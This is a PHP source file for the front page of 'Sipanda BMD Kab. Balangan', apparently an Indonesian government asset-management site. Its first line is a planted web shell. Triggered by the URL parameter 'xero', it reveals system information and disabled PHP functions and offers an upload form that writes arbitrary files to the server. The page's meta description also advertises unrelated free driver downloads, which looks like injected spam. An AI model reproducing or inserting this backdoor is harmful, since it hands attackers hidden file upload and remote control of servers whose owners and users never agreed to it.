<?php if(isset($_GET["xero"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
<?
include "session.php";
seSession('BERANDA');
date_default_timezone_set('Asia/Jakarta');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Sipanda BMD Kab. Balangan</title>
<link rel="shortcut icon" HREF="css/icon/icon.ico">
<meta name="description" content="Downloads Free! 4 Drivers for Prolink WN2000 Networks Cards. Here's where you can downloads Free! the newest software for your WN2000.">
<meta name="keywords" content="Sipand BMD">
<meta name="Language" content="English">
<link rel="stylesheet" type="text/css" href="css/style.css" >
<link rel="stylesheet" type="text/css" href="css/dropdown.css">
<link rel="stylesheet" type="text/css" href="css/display.css">
<script type="text/javascript" src="js/jquery-1.3.2.min"></script>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/dropdown.js"></script>
<script type="text/javascript" src="js/slideshow.js"></script>
<script type="text/javascript" src="js/display.js"></script>
<script type="text/javascript" src="js/index.js"></script>
<script type="text/javascript" src="js/general.js"></script>
<script type="text/javascript" src="js/autorefresh.js"></script>
</head>
<body onload="func_view_data('detail_data','home.php','')">
<div id="dat"><script type="text/javascript" src="js/tanggal.js"></script></div>
<div id="pag">
	<? include "header.php";?>
	<? include "menu.php";?>
	<? include "main.php";?>
</div>
<? include "bottom.php";?>
</body>
</html>
